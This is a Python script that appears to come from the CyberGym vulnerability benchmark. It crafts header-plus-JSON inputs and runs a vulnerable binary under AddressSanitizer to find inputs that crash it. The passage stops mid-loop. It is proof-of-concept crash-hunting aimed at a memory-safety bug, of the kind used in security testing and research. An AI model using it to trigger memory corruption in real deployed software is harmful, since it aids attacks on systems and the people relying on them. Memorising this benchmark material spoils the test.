import os, subprocess, itertools, random

BIN="/out-vul/"+os.environ["CYBERGYM_TARGET_BINARY"]
PRE="/usr/lib/x86_64-linux-gnu/libasan.so.2"
env=dict(os.environ); env["LD_PRELOAD"]=PRE; env["ASAN_OPTIONS"]="detect_leaks=0:abort_on_error=0"

def build(payload, b5=0, extra=None):
    hdr=bytearray(9)
    hdr[0]=0; hdr[1]=0; hdr[2]=0; hdr[3]=1; hdr[4]=0
    hdr[5]=b5&3
    if extra is not None:
        hdr[6]=1; hdr[7]=extra[0]&3; hdr[8]=0
    else:
        hdr[6]=0;hdr[7]=0;hdr[8]=0
    out=bytes(hdr)
    if extra is not None:
        fb=(extra[1] or 'x').encode()[:15]
        out+=fb+b'\x00'*(16-len(fb))
    return out+payload

def run(data, tag):
    open('/tmp/s.bin','wb').write(data)
    try:
        r=subprocess.run([BIN,'/tmp/s.bin'],env=env,capture_output=True,timeout=15)
    except subprocess.TimeoutExpired:
        return None
    out=(r.stdout+r.stderr).decode('latin1')
    if r.returncode!=0 or 'ERROR' in out or 'SUMMARY' in out or 'double' in out.lower():
        return (tag, r.returncode, out[:800])
    return None

def big_map(n):
    return ('{'+','.join('"k%d":%d'%(i,i) for i in range(n))+'}').encode()

payloads={
 'simple': b'{"a":"b"}',
 'nested_str': b'{"log":"{\\"a\\":\\"b\\"}"}',
 'big300': big_map(300),
 'big600': big_map(600),
 'big1500': big_map(1500),
 'arr500': ('['+','.join('1'*1 for _ in range(500))+']').encode(),
 'nestjson': b'{"a":{"b":{"c":"{\\"d\\":1}"}}}',
}
kinds=[0,1,2,3]
found=[]
cnt=0
for pname,p in payloads.items():
  for b5 in kinds:
    for extra in [None,(1,'log'),(1,'a'),(2,'log'),(3,'log'),(0,'log'),(1,'k1'),(1,'time')]:
